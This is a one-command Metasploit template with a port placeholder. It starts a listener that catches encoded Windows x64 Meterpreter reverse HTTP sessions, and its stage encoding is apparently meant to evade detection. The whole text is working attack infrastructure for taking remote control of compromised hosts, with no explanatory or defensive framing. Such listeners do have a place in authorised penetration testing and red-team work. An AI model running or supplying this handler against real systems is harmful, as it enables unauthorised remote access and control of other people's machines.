msfconsole -q -x 'use exploit/multi/handler;
set LHOST 0.0.0.0;
set LPORT {{ LPORT }};
set PAYLOAD windows/x64/meterpreter_reverse_http;
set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru;
set AutoLoadStdapi false;
run'
